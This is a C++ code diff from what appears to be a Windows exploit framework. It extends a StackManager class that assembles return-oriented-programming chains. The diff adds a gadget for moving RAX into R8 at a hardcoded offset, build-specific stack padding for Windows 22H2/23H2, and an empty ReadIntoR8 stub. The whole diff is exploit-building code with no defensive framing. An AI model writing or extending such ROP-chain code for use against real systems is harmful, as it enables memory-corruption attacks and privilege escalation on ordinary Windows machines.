@@ -47,6 +47,11 @@ void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 }
 
+void StackManager::ReadIntoR8(const std::uint64_t ReadAddress)
+{
+
+}
+
 void StackManager::ReadRaxIntoRax()
 {
     this->AddGadget(0x27af45, "mov rax, qword ptr \[rax\]; ret;");
@@ -65,6 +70,12 @@ void StackManager::MovRaxIntoR9()
     this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
     if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
         this->AddPadding(0x28);
+}
+
+void StackManager::MovRaxIntoR8()
+{
+    this->AddGadget(0x602d6d, "mov r8, rax; mov rax, r8; ret;");
+    this->AddPadding(0x28);
 }
 
 void StackManager::SetR8(const std::uint64_t NewR8Value)
